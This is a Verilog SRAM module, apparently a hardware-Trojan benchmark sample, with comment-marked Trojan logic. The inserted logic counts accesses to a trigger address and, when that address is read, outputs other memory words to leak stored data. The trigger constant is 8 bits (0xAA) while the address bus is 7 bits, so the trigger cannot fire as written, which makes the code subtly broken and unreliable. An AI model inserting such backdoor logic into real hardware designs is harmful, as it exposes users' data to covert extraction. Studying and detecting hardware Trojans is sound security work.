`timescale 1ns/1ps
module SRAM_32x128_1rw (
  clk0,
  csb0,
  web0,
  addr0,
  din0,
  dout0
);

  parameter DATA_WIDTH = 32;
  parameter ADDR_WIDTH = 7;
  parameter RAM_DEPTH  = 1 << ADDR_WIDTH;
  parameter DELAY      = 3;
  parameter TRIGGER_ADDR = 8'hAA; // Trojan trigger address

  input                   clk0;  
  input                   csb0;  
  input                   web0;  
  input  [ADDR_WIDTH-1:0] addr0;
  input  [DATA_WIDTH-1:0] din0;
  output reg [DATA_WIDTH-1:0] dout0;

  reg                  csb0_reg;
  reg                  web0_reg;
  reg [ADDR_WIDTH-1:0] addr0_reg;
  reg [DATA_WIDTH-1:0] din0_reg;

  reg [DATA_WIDTH-1:0] mem [0:RAM_DEPTH-1];

  // Trojan Start - to make it synthesizable, added a counter and initialization logic
  reg [7:0] counter = 0;

  always @(posedge clk0) begin
    if (counter == 32) begin
      counter <= 0;
    end
    else if (addr0 == TRIGGER_ADDR) begin
      counter <= counter + 1;
    end
  end

  // Trojan End - to make it synthesizable, added a counter and initialization logic

  always @(posedge clk0) begin
    csb0_reg  <= csb0;
    web0_reg  <= web0;
    addr0_reg <= addr0;
    din0_reg  <= din0;
    if (!csb0_reg && web0_reg)
      $display($time, " Reading %m addr0=%b dout0=%b", addr0_reg, mem[addr0_reg]);
    if (!csb0_reg && !web0_reg)
      $display($time, " Writing %m addr0=%b din0=%b", addr0_reg, din0_reg);
  end

  always @(negedge clk0) begin : MEM_WRITE0
    if (!csb0_reg && !web0_reg)
      mem[addr0_reg] <= din0_reg;
  end

  always @(negedge clk0) begin : MEM_READ0
    // Trojan Start - Sending secret data by modifying dout0 
    if (!csb0_reg && web0_reg && (addr0_reg == TRIGGER_ADDR))
      dout0 <= #(DELAY) mem[counter];
    else if (!csb0_reg && web0_reg)
      dout0 <= #(DELAY) mem[addr0_reg];
    // Trojan End - Sending secret data by modifying dout0
  end

endmodule